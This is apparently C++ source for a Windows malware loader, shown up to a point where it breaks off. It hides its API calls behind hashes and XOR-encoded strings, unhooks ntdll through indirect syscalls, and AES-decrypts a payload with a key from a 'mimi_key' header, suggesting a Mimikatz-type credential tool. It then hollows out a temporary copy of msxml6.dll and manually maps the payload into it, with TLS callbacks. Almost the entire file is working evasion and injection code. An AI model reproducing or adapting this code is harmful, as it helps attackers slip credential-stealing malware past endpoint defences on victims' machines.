
#include <Windows.h>
#include <winternl.h>
#include "resolve.h"

#pragma function(memset, memcpy)
extern "C" void* memset(void* dst, int val, size_t cnt) {
    unsigned char* d = (unsigned char*)dst;
    while (cnt--) *d++ = (unsigned char)val;
    return dst;
}
extern "C" void* memcpy(void* dst, const void* src, size_t cnt) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (cnt--) *d++ = *s++;
    return dst;
}

#pragma comment(lib, "user32.lib")
static volatile FARPROC _u32[] = { (FARPROC)&GetDC, (FARPROC)&ReleaseDC, (FARPROC)&GetSystemMetrics };

extern "C" NTSTATUS DoIndirectVP(LPVOID addr, SIZE_T size, DWORD prot, PDWORD old, DWORD ssn, PVOID gadget);
extern "C" NTSTATUS DoIndirectAVM(HANDLE proc, PVOID* base, ULONG_PTR zeroBits, PSIZE_T size, ULONG allocType, ULONG protect, DWORD ssn, PVOID gadget);

typedef HMODULE(WINAPI* fn_LLA)(LPCSTR);
typedef LPVOID(WINAPI* fn_VA)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fn_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* fn_CF)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL(WINAPI* fn_RF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef DWORD(WINAPI* fn_GFS)(HANDLE,LPDWORD);
typedef BOOL(WINAPI* fn_CH)(HANDLE);
typedef HANDLE(WINAPI* fn_CT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef DWORD(WINAPI* fn_WF)(HANDLE,DWORD);
typedef FARPROC(WINAPI* fn_GPA)(HMODULE,LPCSTR);

static void xd(char* o, const unsigned char* d, DWORD l, unsigned char k) {
    for (DWORD i=0;i<l;i++) o[i]=d[i]^k; o[l]=0;
}

static void sha1_xf(DWORD st[5], const BYTE blk[64]) {
    DWORD w[80], a, b, c, d, e, t;
    for (int i = 0; i < 16; i++)
        w[i] = ((DWORD)blk[i*4]<<24)|((DWORD)blk[i*4+1]<<16)|((DWORD)blk[i*4+2]<<8)|blk[i*4+3];
    for (int i = 16; i < 80; i++) { t = w[i-3]^w[i-8]^w[i-14]^w[i-16]; w[i] = (t<<1)|(t>>31); }
    a=st[0]; b=st[1]; c=st[2]; d=st[3]; e=st[4];
    for (int i = 0; i < 80; i++) {
        DWORD f, k;
        if (i < 20) { f=(b&c)|((~b)&d); k=0x5A827999; }
        else if (i < 40) { f=b^c^d; k=0x6ED9EBA1; }
        else if (i < 60) { f=(b&c)|(b&d)|(c&d); k=0x8F1BBCDC; }
        else { f=b^c^d; k=0xCA62C1D6; }
        t=((a<<5)|(a>>27))+f+e+k+w[i]; e=d; d=c; c=(b<<30)|(b>>2); b=a; a=t;
    }
    st[0]+=a; st[1]+=b; st[2]+=c; st[3]+=d; st[4]+=e;
}
static void sha1(const BYTE* data, DWORD len, BYTE out[20]) {
    DWORD st[5] = {0x67452301,0xEFCDAB89,0x98BADCFE,0x10325476,0xC3D2E1F0};
    BYTE blk[64]; DWORD i, j = 0;
    for (i = 0; i < len; i++) { blk[j++] = data[i]; if (j == 64) { sha1_xf(st, blk); j = 0; } }
    blk[j++] = 0x80;
    if (j > 56) { while (j < 64) blk[j++] = 0; sha1_xf(st, blk); j = 0; }
    while (j < 56) blk[j++] = 0;
    DWORD bits = len * 8;
    blk[56]=0; blk[57]=0; blk[58]=0; blk[59]=0;
    blk[60]=(BYTE)(bits>>24); blk[61]=(BYTE)(bits>>16); blk[62]=(BYTE)(bits>>8); blk[63]=(BYTE)bits;
    sha1_xf(st, blk);
    for (i = 0; i < 5; i++) { out[i*4]=(BYTE)(st[i]>>24); out[i*4+1]=(BYTE)(st[i]>>16); out[i*4+2]=(BYTE)(st[i]>>8); out[i*4+3]=(BYTE)st[i]; }
}

static BYTE aes_sb[256] = {
    0xc6,0xd9,0xd2,0xde,0x57,0xce,0xca,0x60,0x95,0xa4,0xc2,0x8e,0x5b,0x72,0x0e,0xd3,
    0x6f,0x27,0x6c,0xd8,0x5f,0xfc,0xe2,0x55,0x08,0x71,0x07,0x0a,0x39,0x01,0xd7,0x65,
    0x12,0x58,0x36,0x83,0x93,0x9a,0x52,0x69,0x91,0x00,0x40,0x54,0xd4,0x7d,0x94,0xb0,
    0xa1,0x62,0x86,0x66,0xbd,0x33,0xa0,0x3f,0xa2,0xb7,0x25,0x47,0x4e,0x82,0x17,0xd0,
    0xac,0x26,0x89,0xbf,0xbe,0xcb,0xff,0x05,0xf7,0x9e,0x73,0x16,0x8c,0x46,0x8a,0x21,
    0xf6,0x74,0xa5,0x48,0x85,0x59,0x14,0xfe,0xcf,0x6e,0x1b,0x9c,0xef,0xe9,0xfd,0x6a,
    0x75,0x4a,0x0f,0x5e,0xe6,0xe8,0x96,0x20,0xe0,0x5c,0xa7,0xda,0xf5,0x99,0x3a,0x0d,
    0xf4,0x06,0xe5,0x2a,0x37,0x38,0x9d,0x50,0x19,0x13,0x7f,0x84,0xb5,0x5a,0x56,0x77,
    0x68,0xa9,0xb6,0x49,0xfa,0x32,0xe1,0xb2,0x61,0x02,0xdb,0x98,0xc1,0xf8,0xbc,0xd6,
    0xc5,0x24,0xea,0x79,0x87,0x8f,0x35,0x2d,0xe3,0x4b,0x1d,0xb1,0x7b,0xfb,0xae,0x7e,
    0x45,0x97,0x9f,0xaf,0xec,0xa3,0x81,0xf9,0x67,0x76,0x09,0xc7,0x34,0x30,0x41,0xdc,
    0x42,0x6d,0x92,0xc8,0x28,0x70,0xeb,0x0c,0xc9,0xf3,0x51,0x4f,0xc0,0xdf,0x0b,0xad,
    0x1f,0xdd,0x80,0x8b,0xb9,0x03,0x11,0x63,0x4d,0x78,0xd1,0xba,0xee,0x18,0x2e,0x2f,
    0xd5,0x9b,0x10,0xc3,0xed,0xa6,0x53,0xab,0xc4,0x90,0xf2,0x1c,0x23,0x64,0xb8,0x3b,
    0x44,0x5d,0x3d,0xb4,0xcc,0x7c,0x2b,0x31,0x3e,0xbb,0x22,0x4c,0x6b,0xf0,0x8d,0x7a,
    0x29,0x04,0x2c,0xa8,0x1a,0x43,0xe7,0xcd,0xe4,0x3c,0x88,0xaa,0x15,0xf1,0x1e,0xb3
};
static BYTE aes_isb[256] = {
    0xf7,0xac,0xcf,0x70,0x95,0x93,0x00,0x9d,0x1a,0xe5,0x06,0x3b,0x24,0x56,0x72,0x5e,
    0xd9,0x46,0x9c,0x27,0x3e,0x8a,0x5a,0x22,0x91,0x2b,0xe6,0xe1,0x61,0x7b,0x4c,0x6e,
    0xf1,0xde,0x31,0x97,0x03,0x67,0x86,0x98,0x4b,0xe9,0x30,0xae,0xe7,0x5f,0x66,0xeb,
    0xad,0x8b,0x04,0xc3,0x8d,0x7c,0x81,0x17,0xd3,0xfe,0x07,0xec,0xc8,0x2e,0x74,0x80,
    0xd7,0x5d,0x53,0xc1,0x23,0xcd,0x3d,0xb3,0x71,0x01,0xf9,0x69,0xf8,0xc0,0x13,0x37,
    0xc9,0xd5,0xed,0xf5,0x58,0x48,0x1c,0x7f,0xfb,0xb0,0xe3,0xf2,0x02,0x28,0x38,0x21,
    0x35,0x7d,0x0e,0xa5,0x29,0x19,0x76,0xaf,0x52,0x41,0xfd,0xa0,0x1d,0x16,0xe0,0xa3,
    0x75,0x89,0xbb,0x2a,0x6f,0x9a,0xaa,0xa7,0x64,0x0a,0x18,0xa6,0xa4,0xb6,0x2f,0xce,
    0x9f,0x34,0xb4,0xe4,0xea,0xc2,0x79,0x4f,0x32,0x57,0x6a,0x6b,0x55,0x11,0x43,0xd6,
    0x33,0x09,0xd1,0x87,0x42,0x08,0x90,0x20,0x47,0x5c,0x92,0x4d,0xb9,0xd0,0x7a,0xcb,
    0xe2,0x54,0xbf,0xd4,0xb8,0x8c,0x60,0x2c,0xca,0x12,0xc7,0xab,0x0f,0xbd,0x1b,0xbe,
    0x59,0xf3,0x9b,0xee,0x63,0x77,0xdc,0x85,0x3f,0x7e,0x65,0x5b,0xdd,0x68,0xff,0x51,
    0xba,0x78,0x0d,0x96,0x2d,0xa2,0x62,0x94,0x14,0xb7,0xb5,0xfc,0x82,0x25,0x49,0xfa,
    0xc5,0xf4,0xda,0x0c,0xbc,0x10,0xef,0xa8,0x88,0x40,0xdf,0x3a,0x36,0x6c,0x39,0x4a,
    0x05,0x45,0x9e,0xe8,0x0b,0x8f,0x50,0x15,0x6d,0x4e,0x1e,0x99,0x26,0xf6,0x3c,0xc4,
    0xb2,0x8e,0xa1,0xdb,0x1f,0xd2,0x73,0x83,0x44,0xcc,0xb1,0xc6,0xf0,0x84,0xa9,0xd8
};
static const BYTE aes_rc[10] = {0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36};
static volatile LONG aes_tbl_ready = 0;
static void aes_decode_tables() {
    if (InterlockedExchange(&aes_tbl_ready, 1) == 0) {
        for (int i = 0; i < 256; i++) { aes_sb[i] ^= 0xA5; aes_isb[i] ^= 0xA5; }
    }
}

static void aes256_kx(const BYTE key[32], BYTE rk[240]) {
    BYTE t[4]; int bg = 32, ri = 0;
    for (int i = 0; i < 32; i++) rk[i] = key[i];
    while (bg < 240) {
        for (int i = 0; i < 4; i++) t[i] = rk[bg-4+i];
        if (bg % 32 == 0) {
            BYTE u = t[0]; t[0]=aes_sb[t[1]]; t[1]=aes_sb[t[2]]; t[2]=aes_sb[t[3]]; t[3]=aes_sb[u];
            t[0] ^= aes_rc[ri++];
        } else if (bg % 32 == 16) {
            for (int i = 0; i < 4; i++) t[i] = aes_sb[t[i]];
        }
        for (int i = 0; i < 4; i++) rk[bg+i] = rk[bg-32+i] ^ t[i];
        bg += 4;
    }
}

static void aes256_dec_blk(const BYTE in[16], BYTE out[16], const BYTE rk[240]) {
    BYTE s[16];
    for (int i = 0; i < 16; i++) s[i] = in[i] ^ rk[224+i];
    for (int r = 13; r >= 1; r--) {
        BYTE t[16];
        t[0]=s[0]; t[1]=s[13]; t[2]=s[10]; t[3]=s[7];
        t[4]=s[4]; t[5]=s[1]; t[6]=s[14]; t[7]=s[11];
        t[8]=s[8]; t[9]=s[5]; t[10]=s[2]; t[11]=s[15];
        t[12]=s[12]; t[13]=s[9]; t[14]=s[6]; t[15]=s[3];
        for (int i = 0; i < 16; i++) t[i] = aes_isb[t[i]];
        for (int i = 0; i < 16; i++) t[i] ^= rk[r*16+i];
        for (int c = 0; c < 4; c++) {
            BYTE a0=t[c*4], a1=t[c*4+1], a2=t[c*4+2], a3=t[c*4+3];
            #define xtime(x) ((BYTE)(((x)<<1) ^ ((((x)>>7)&1)*0x1b)))
            #define mul(x,y) (((y&1)?x:0)^((y&2)?xtime(x):0)^((y&4)?xtime(xtime(x)):0)^((y&8)?xtime(xtime(xtime(x))):0))
            s[c*4]  = (BYTE)(mul(a0,14)^mul(a1,11)^mul(a2,13)^mul(a3,9));
            s[c*4+1]= (BYTE)(mul(a0,9)^mul(a1,14)^mul(a2,11)^mul(a3,13));
            s[c*4+2]= (BYTE)(mul(a0,13)^mul(a1,9)^mul(a2,14)^mul(a3,11));
            s[c*4+3]= (BYTE)(mul(a0,11)^mul(a1,13)^mul(a2,9)^mul(a3,14));
            #undef xtime
            #undef mul
        }
    }
    {
        BYTE t[16];
        t[0]=s[0]; t[1]=s[13]; t[2]=s[10]; t[3]=s[7];
        t[4]=s[4]; t[5]=s[1]; t[6]=s[14]; t[7]=s[11];
        t[8]=s[8]; t[9]=s[5]; t[10]=s[2]; t[11]=s[15];
        t[12]=s[12]; t[13]=s[9]; t[14]=s[6]; t[15]=s[3];
        for (int i = 0; i < 16; i++) out[i] = aes_isb[t[i]] ^ rk[i];
    }
}

static DWORD aes256cbc_dec(BYTE* data, DWORD len, const BYTE key[32], const BYTE iv[16]) {
    if (len == 0 || len % 16 != 0) return 0;
    BYTE rk[240];
    aes256_kx(key, rk);
    BYTE prev[16];
    for (int i = 0; i < 16; i++) prev[i] = iv[i];
    for (DWORD off = 0; off < len; off += 16) {
        BYTE ct[16], pt[16];
        for (int i = 0; i < 16; i++) ct[i] = data[off+i];
        aes256_dec_blk(ct, pt, rk);
        for (int i = 0; i < 16; i++) data[off+i] = pt[i] ^ prev[i];
        for (int i = 0; i < 16; i++) prev[i] = ct[i];
    }
    BYTE pad = data[len-1];
    if (pad == 0 || pad > 16) return len;
    for (BYTE i = 0; i < pad; i++) if (data[len-1-i] != pad) return len;
    return len - pad;
}

static volatile const char _build_ts[] = "1.0";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)nCmdShow; (void)_build_ts;

    HMODULE hK = GetModH(0xFB4F5B77u);
    if (!hK) return 10;

    typedef void(WINAPI* fn_SLP)(DWORD);
    fn_SLP pSLP = (fn_SLP)GetExpH(hK, 0x46FA77B8u);
    if (pSLP) pSLP(1500);

    fn_LLA pLLA = (fn_LLA)GetExpH(hK, 0x97FD671Fu);
    fn_VA  pVA  = (fn_VA)GetExpH(hK, 0xFB9400ABu);
    fn_VP  pVP  = (fn_VP)GetExpH(hK, 0x81BD9BADu);
    fn_CT  pCT  = (fn_CT)GetExpH(hK, 0xF51FF82Du);
    fn_WF  pWF  = (fn_WF)GetExpH(hK, 0x793529D8u);
    fn_CF  pCF  = (fn_CF)GetExpH(hK, 0xC0DBB964u);
    fn_RF  pRF  = (fn_RF)GetExpH(hK, 0xB9835133u);
    fn_GFS pGFS = (fn_GFS)GetExpH(hK, 0x0EAE9872u);
    fn_CH  pCH  = (fn_CH)GetExpH(hK, 0x82E971DBu);

    HMODULE hKB = GetModH(0x2390E863u);
    fn_GPA pGPA = hKB ? (fn_GPA)GetExpH(hKB, 0xB0F41F09u) : NULL;
    if (!pLLA || !pVA || !pVP || !pCT || !pWF || !pGPA || !pCF || !pRF || !pGFS || !pCH) return 11;

    HMODULE hNT = GetModH(0xBFF6D513u);
    DWORD ssnVP = 0, ssnAVM = 0;
    PVOID gadget = NULL;
    if (hNT) {
        PIMAGE_NT_HEADERS ntNh = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNT + ((PIMAGE_DOS_HEADER)hNT)->e_lfanew);
        DWORD ntSz = ntNh->OptionalHeader.SizeOfImage;
        BYTE* scan = (BYTE*)hNT;
        for (DWORD i = 0; i < ntSz - 3; i++) {
            if (scan[i] == 0x0F && scan[i+1] == 0x05 && scan[i+2] == 0xC3) {
                gadget = &scan[i];
                break;
            }
        }
        char ntpath[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
        HANDLE hNtF = pCF(ntpath, 0x80000000, 1, NULL, 3, 0x80, NULL);
        if (hNtF != INVALID_HANDLE_VALUE) {
            DWORD ntFSz = pGFS(hNtF, NULL);
            BYTE* ntRaw = (BYTE*)pVA(NULL, ntFSz, 0x3000, 0x04);
            if (ntRaw) {
                DWORD ntRd;
                pRF(hNtF, ntRaw, ntFSz, &ntRd, NULL);
                pCH(hNtF);
                PIMAGE_DOS_HEADER ntDos = (PIMAGE_DOS_HEADER)ntRaw;
                PIMAGE_NT_HEADERS ntNhC = (PIMAGE_NT_HEADERS)(ntRaw + ntDos->e_lfanew);
                DWORD ntImgSz = ntNhC->OptionalHeader.SizeOfImage;
                BYTE* ntClean = (BYTE*)pVA(NULL, ntImgSz, 0x3000, 0x04);
                if (ntClean) {
                    for (DWORD ci = 0; ci < ntNhC->OptionalHeader.SizeOfHeaders; ci++)
                        ntClean[ci] = ntRaw[ci];
                    PIMAGE_SECTION_HEADER ntSec = IMAGE_FIRST_SECTION(ntNhC);
                    for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
                        if (ntSec[si].SizeOfRawData > 0)
                            for (DWORD j = 0; j < ntSec[si].SizeOfRawData; j++)
                                ntClean[ntSec[si].VirtualAddress + j] = ntRaw[ntSec[si].PointerToRawData + j];
                    }
                    FARPROC pNtPVM = GetExpH((HMODULE)ntClean, 0x889C44B6u);
                    if (pNtPVM) ssnVP = *(DWORD*)((BYTE*)pNtPVM + 4);
                    FARPROC pNtAVM = GetExpH((HMODULE)ntClean, 0xC56666C0u);
                    if (pNtAVM) ssnAVM = *(DWORD*)((BYTE*)pNtAVM + 4);

                    if (ssnVP && gadget) {
                        PIMAGE_SECTION_HEADER ntSec2 = IMAGE_FIRST_SECTION(ntNhC);
                        for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
                            if (ntSec2[si].Characteristics & 0x20) {
                                BYTE* hookedText = (BYTE*)hNT + ntSec2[si].VirtualAddress;
                                BYTE* cleanText = ntClean + ntSec2[si].VirtualAddress;
                                SIZE_T textSz = ntSec2[si].Misc.VirtualSize;
                                DWORD oldP;
                                DoIndirectVP(hookedText, textSz, 0x40, &oldP, ssnVP, gadget);
                                for (DWORD j = 0; j < (DWORD)textSz; j++)
                                    hookedText[j] = cleanText[j];
                                DoIndirectVP(hookedText, textSz, oldP, &oldP, ssnVP, gadget);
                                break;
                            }
                        }
                    }
                    (void)ssnAVM;
                }
            } else {
                pCH(hNtF);
            }
        }
    }

    char cj[16];
    const unsigned char enc_cj[] = {0x4A,0x45,0x5B,0x43,0x40,0x5D,0x07,0x4D,0x45,0x45};
    xd(cj, enc_cj, sizeof(enc_cj), 0x29);
    HMODULE hCJ = pLLA(cj);
    BYTE* cjText = NULL;
    if (hCJ) {
        PIMAGE_DOS_HEADER cjD = (PIMAGE_DOS_HEADER)hCJ;
        PIMAGE_NT_HEADERS cjN = (PIMAGE_NT_HEADERS)((ULONG_PTR)hCJ + cjD->e_lfanew);
        PIMAGE_SECTION_HEADER cjS = IMAGE_FIRST_SECTION(cjN);
        for (WORD i = 0; i < cjN->FileHeader.NumberOfSections; i++) {
            if (cjS[i].Characteristics & 0x20) {
                cjText = (BYTE*)hCJ + cjS[i].VirtualAddress;
                break;
            }
        }
        if (cjText) {
            DWORD old;
            pVP(cjText, 4096, 0x40, &old);
        }
    }

    {
        char s_gcla[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0};
        typedef LPSTR(WINAPI* fn_GCLA)();
        fn_GCLA pGCLA = (fn_GCLA)pGPA(hK, s_gcla);
        if (!pGCLA) return 12;
        lpCmdLine = pGCLA();
        if (*lpCmdLine == '"') { lpCmdLine++; while (*lpCmdLine && *lpCmdLine != '"') lpCmdLine++; if (*lpCmdLine) lpCmdLine++; }
        else { while (*lpCmdLine && *lpCmdLine != ' ') lpCmdLine++; }
        while (*lpCmdLine == ' ') lpCmdLine++;
    }
    if (!lpCmdLine[0]) return 12;

    if ((lpCmdLine[0] == '-' && lpCmdLine[1] == 'h') ||
        (lpCmdLine[0] == '/' && lpCmdLine[1] == '?')) {
        return 0;
    }

    char* payloadPath = lpCmdLine;
    while (*payloadPath == ' ' || *payloadPath == '"') payloadPath++;
    char cleanPath[260];
    int pi = 0;
    while (payloadPath[pi] && payloadPath[pi] != '"' && pi < 259) { cleanPath[pi] = payloadPath[pi]; pi++; }
    cleanPath[pi] = 0;
    char* extraArgs = payloadPath + pi;
    if (*extraArgs == '"') extraArgs++;
    while (*extraArgs == ' ') extraArgs++;

    char logPath[260];
    logPath[0] = 0;
    {
        char* scan = extraArgs;
        while (*scan) {
            while (*scan == ' ') scan++;
            if (!*scan) break;
            if (scan[0] == '/' && scan[1] == 'l' && scan[2] == 'o' && scan[3] == 'g' && scan[4] == ':') {
                char* lp = scan + 5;
                int li = 0;
                char* argEnd;
                if (*lp == '"') {
                    lp++;
                    while (lp[li] && lp[li] != '"' && li < 258) { logPath[li] = lp[li]; li++; }
                    logPath[li] = 0;
                    argEnd = lp + li;
                    if (*argEnd == '"') argEnd++;
                } else {
                    while (lp[li] && lp[li] != ' ' && li < 258) { logPath[li] = lp[li]; li++; }
                    logPath[li] = 0;
                    argEnd = lp + li;
                }
                while (*argEnd == ' ') argEnd++;
                char* dst = scan;
                while (*argEnd) *dst++ = *argEnd++;
                *dst = 0;
                break;
            }
            if (*scan == '"') { scan++; while (*scan && *scan != '"') scan++; if (*scan) scan++; }
            else { while (*scan && *scan != ' ') scan++; }
        }
    }

    HANDLE hFile = pCF(cleanPath, 0x80000000, 1, NULL, 3, 0x80, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 14;
    DWORD total = pGFS(hFile, NULL);
    if (total == 0xFFFFFFFF || total < 0x100) { pCH(hFile); return 15; }

    LPVOID buf = pVA(NULL, total, 0x3000, 0x04);
    if (!buf) { pCH(hFile); return 16; }

    DWORD rd = 0, totalRead = 0;
    while (totalRead < total) {
        if (!pRF(hFile, (BYTE*)buf + totalRead, total - totalRead, &rd, NULL) || rd == 0) break;
        totalRead += rd;
    }
    pCH(hFile);
    if (totalRead < 0x100) return 17;
    total = totalRead;

    DWORD evSz = *(DWORD*)buf;
    {
        DWORD skip = 4;
        if (evSz > 0 && evSz < 0x100000 && 4 + evSz < total) skip = 4 + evSz;
        for (DWORD mv = 0; mv < total - skip; mv++) ((BYTE*)buf)[mv] = ((BYTE*)buf)[skip + mv];
        total -= skip;
    }

    aes_decode_tables();

    #include "mimi_key.h"
    BYTE hashOut[20];
    sha1(keyBuff, sizeof(keyBuff), hashOut);
    BYTE aesKey[32];
    for (int ki = 0; ki < 20; ki++) aesKey[ki] = hashOut[ki];
    for (int ki = 20; ki < 32; ki++) aesKey[ki] = 0;

    BYTE iv[16];
    for (int vi = 0; vi < 16; vi++) iv[vi] = ((BYTE*)buf)[vi];
    for (DWORD mv = 0; mv < total - 16; mv++) ((BYTE*)buf)[mv] = ((BYTE*)buf)[16 + mv];
    total -= 16;

    DWORD decLen = aes256cbc_dec((BYTE*)buf, total, aesKey, iv);
    if (decLen < 0x100) return 18;

    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)buf;
    if (dh->e_magic != 0x5A4D) return 25;
    PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((ULONG_PTR)buf + dh->e_lfanew);
    DWORD imgSz = nh->OptionalHeader.SizeOfImage;

    LPVOID img;
    {
        char s_cfa[] = {'C','o','p','y','F','i','l','e','A',0};
        char s_gtp[] = {'G','e','t','T','e','m','p','P','a','t','h','A',0};
        typedef BOOL(WINAPI* fn_CFA)(LPCSTR, LPCSTR, BOOL);
        typedef DWORD(WINAPI* fn_GTP)(DWORD, LPSTR);
        fn_CFA pCFA = (fn_CFA)pGPA(hK, s_cfa);
        fn_GTP pGTP = (fn_GTP)pGPA(hK, s_gtp);
        if (!pCFA || !pGTP) return 30;
        char src[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','m','s','x','m','l','6','.','d','l','l',0};
        char tb[80]; DWORD tl = pGTP(sizeof(tb), tb);
        if (tl == 0) return 30;
        char dst[100]; int di = 0;
        for (DWORD ti = 0; ti < tl && di < 90; ti++) dst[di++] = tb[ti];
        if (di > 0 && dst[di-1] != '\\') dst[di++] = '\\';
        char sfx[] = {'x','c','f','g','.','d','l','l',0};
        for (int si = 0; sfx[si]; si++) dst[di++] = sfx[si];
        dst[di] = 0;
        pCFA(src, dst, FALSE);
        char s_llex[] = {'L','o','a','d','L','i','b','r','a','r','y','E','x','A',0};
        typedef HMODULE(WINAPI* fn_LLEX)(LPCSTR,HANDLE,DWORD);
        fn_LLEX pLLEX = (fn_LLEX)pGPA(hK, s_llex);
        if (!pLLEX) return 31;
        HMODULE hSM = pLLEX(dst, NULL, 1);
        if (!hSM) return 32;
        PIMAGE_NT_HEADERS stNh = (PIMAGE_NT_HEADERS)((BYTE*)hSM + ((PIMAGE_DOS_HEADER)hSM)->e_lfanew);
        DWORD stSz = stNh->OptionalHeader.SizeOfImage;
        if (stSz < imgSz) return 33;
        DWORD oldp;
        pVP((LPVOID)hSM, stSz, 0x04, &oldp);
        for (DWORD z = 0; z < stSz; z++) ((BYTE*)hSM)[z] = 0;
        img = (LPVOID)hSM;

        char s_dfa[] = {'D','e','l','e','t','e','F','i','l','e','A',0};
        typedef BOOL(WINAPI* fn_DFA)(LPCSTR);
        fn_DFA pDFA = (fn_DFA)pGPA(hK, s_dfa);
        if (pDFA) pDFA(dst);
    }

    for (DWORD i = 0; i < nh->OptionalHeader.SizeOfHeaders; i++)
        ((BYTE*)img)[i] = ((BYTE*)buf)[i];

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nh);
    for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            BYTE* ddst = (BYTE*)img + sec[i].VirtualAddress;
            BYTE* ssrc = (BYTE*)buf + sec[i].PointerToRawData;
            for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
                ddst[j] = ssrc[j];
        }
    }

    ULONG_PTR delta = (ULONG_PTR)img - nh->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY relDir = nh->OptionalHeader.DataDirectory[5];
    if (delta && relDir.VirtualAddress) {
        BYTE* reloc = (BYTE*)img + relDir.VirtualAddress;
        while (reloc < (BYTE*)img + relDir.VirtualAddress + relDir.Size) {
            DWORD rva = *(DWORD*)reloc;
            DWORD sz = *(DWORD*)(reloc + 4);
            if (!sz) break;
            WORD* entries = (WORD*)(reloc + 8);
            DWORD count = (sz - 8) / 2;
            for (DWORD i = 0; i < count; i++) {
                if ((entries[i] >> 12) == 10) {
                    ULONG_PTR* p = (ULONG_PTR*)((BYTE*)img + rva + (entries[i] & 0xFFF));
                    *p += delta;
                }
            }
            reloc += sz;
        }
    }

    {
        typedef BOOL(WINAPI* fn_AC)();
        fn_AC pAC = (fn_AC)GetExpH(hK, 0x887D7DBDu);
        if (pAC) pAC();
    }


    IMAGE_DATA_DIRECTORY impDir = nh->OptionalHeader.DataDirectory[1];
    if (impDir.VirtualAddress) {
        BYTE* id = (BYTE*)img + impDir.VirtualAddress;
        while (*(DWORD*)(id + 12)) {
            HMODULE hM = pLLA((char*)((ULONG_PTR)img + *(DWORD*)(id + 12)));
            if (hM) {
                DWORD r0 = *(DWORD*)id, r4 = *(DWORD*)(id + 16);
                ULONG_PTR* lt = (ULONG_PTR*)((BYTE*)img + (r0 ? r0 : r4));
                ULONG_PTR* at = (ULONG_PTR*)((BYTE*)img + r4);
                while (*lt) {
                    LPCSTR fn = (*lt >> 63)
                        ? (LPCSTR)(ULONG_PTR)(*lt & 0xFFFF)
                        : (LPCSTR)((BYTE*)img + (*lt & 0x7FFFFFFF) + 2);
                    *at = (ULONG_PTR)pGPA(hM, fn);
                    lt++; at++;
                }
            }
            id += 20;
        }
    }

    {
        IMAGE_DATA_DIRECTORY excDir = nh->OptionalHeader.DataDirectory[3];
        if (excDir.VirtualAddress && excDir.Size) {
            char raft[20];
            const unsigned char enc_raft[] = {0x08,0x2E,0x36,0x1B,0x3E,0x3E,0x1C,0x2F,0x34,0x39,0x2E,0x33,0x35,0x34,0x0E,0x3B,0x38,0x36,0x3F};
            xd(raft, enc_raft, sizeof(enc_raft), 0x5A);
            typedef BOOLEAN(NTAPI* fn_RAFT)(PRUNTIME_FUNCTION, DWORD, DWORD64);
            fn_RAFT pRAFT = hNT ? (fn_RAFT)pGPA(hNT, raft) : NULL;
            if (pRAFT)
                pRAFT((PRUNTIME_FUNCTION)((BYTE*)img + excDir.VirtualAddress),
                      excDir.Size / sizeof(RUNTIME_FUNCTION),
                      (DWORD64)(ULONG_PTR)img);
        }

    }

    {
        IMAGE_DATA_DIRECTORY tlsDir = nh->OptionalHeader.DataDirectory[9];
        if (tlsDir.VirtualAddress && tlsDir.Size) {
            IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)img + tlsDir.VirtualAddress);
            BYTE* peb2 = (BYTE*)__readgsqword(0x60);
            BYTE* ldr2 = *(BYTE**)(peb2 + 0x18);
            BYTE* hd2 = ldr2 + 0x20;
            BYTE* cr2 = *(BYTE**)hd2;
            DWORD tlsCnt = 0;
            while (cr2 != hd2) {
                HMODULE mx = *(HMODULE*)(cr2 + 0x20);
                if (mx && (LPVOID)mx != img) {
                    IMAGE_NT_HEADERS* mn = (IMAGE_NT_HEADERS*)((BYTE*)mx + ((IMAGE_DOS_HEADER*)mx)->e_lfanew);
                    if (mn->OptionalHeader.DataDirectory[9].VirtualAddress && mn->OptionalHeader.DataDirectory[9].Size)
                        tlsCnt++;
                }
                cr2 = *(BYTE**)cr2;
            }
            PVOID* oldTls = (PVOID*)__readgsqword(0x58);
            PVOID* newTls = (PVOID*)pVA(NULL, (tlsCnt + 1) * sizeof(PVOID), 0x3000, 0x04);
            if (newTls) {
                if (oldTls) for (DWORD ti = 0; ti < tlsCnt; ti++) newTls[ti] = oldTls[ti];
                SIZE_T rawSz = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
                SIZE_T totalSz = rawSz + tls->SizeOfZeroFill;
                LPVOID td = NULL;
                if (totalSz) {
                    td = pVA(NULL, totalSz, 0x3000, 0x04);
                    if (td) for (SIZE_T i = 0; i < rawSz; i++) ((BYTE*)td)[i] = ((BYTE*)(tls->StartAddressOfRawData))[i];
                }
                newTls[tlsCnt] = td;
                *(DWORD*)(tls->AddressOfIndex) = tlsCnt;
                __writegsqword(0x58, (ULONG_PTR)newTls);
                PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
                if (cb) { while (*cb) { (*cb)(img, DLL_PROCESS_ATTACH, NULL); cb++; } }
            }
        }
    }

    if (hNT) {
